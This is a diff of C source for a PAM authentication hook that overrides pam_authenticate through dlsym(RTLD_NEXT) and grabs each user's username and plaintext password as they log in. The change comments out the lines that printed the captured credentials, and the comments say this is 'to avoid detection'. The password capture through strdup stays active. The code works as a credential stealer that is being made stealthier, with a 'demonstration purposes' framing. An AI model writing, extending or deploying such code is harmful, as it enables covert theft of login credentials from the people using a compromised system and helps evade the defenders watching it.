@@ -15,7 +15,7 @@ char *get_username(pam_handle_t *pamh) {
     char *username = NULL;
 
     if (pam_get_item(pamh, PAM_USER, (const void **)&username) == PAM_SUCCESS && username) {
-        fprintf(stderr, "USER =>>>>> %s\n", username);
+//        fprintf(stderr, "USER =>>>>> %s\n", username); this line was commented to avoid detection but can be used for demonstration purposes
 
     } else {
         perror("Failed to retrieve username");
@@ -37,7 +37,7 @@ char *get_password(pam_handle_t *pamh) {
 
         int ret = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
         if (ret == PAM_SUCCESS && resp && resp->resp) {
-            fprintf(stderr, "PASSWORD =>>>>>: %s\n", resp->resp);
+//            fprintf(stderr, "PASSWORD =>>>>>: %s\n", resp->resp); this line was commented to avoid detection but can be used for demonstration purposes
 	    char *password = strdup(resp->resp);
 
             free(resp->resp);
@@ -67,7 +67,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
     if (!original_pam_authenticate) {
         original_pam_authenticate = (pam_authenticate_t)dlsym(RTLD_NEXT, "pam_authenticate");
         if (!original_pam_authenticate) {
-            fprintf(stderr, "Error loading original pam_authenticate: %s\n", dlerror());
+//            fprintf(stderr, "Error loading original pam_authenticate: %s\n", dlerror()); this line was commented to avoid detection but can be used for demonstration purposes
             exit(EXIT_FAILURE);
         }
     }
